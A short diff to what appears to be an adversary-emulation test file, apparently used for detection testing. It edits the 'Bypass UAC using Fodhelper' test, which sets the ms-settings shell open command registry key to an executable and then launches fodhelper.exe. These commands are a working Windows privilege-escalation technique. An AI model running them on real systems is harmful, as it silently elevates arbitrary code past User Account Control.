@@ -64,7 +64,7 @@ atomic_tests:
     name: command_prompt
     command: |
       reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
-      reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
+      reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
       fodhelper.exe
 
 - name: Bypass UAC using Fodhelper - PowerShell
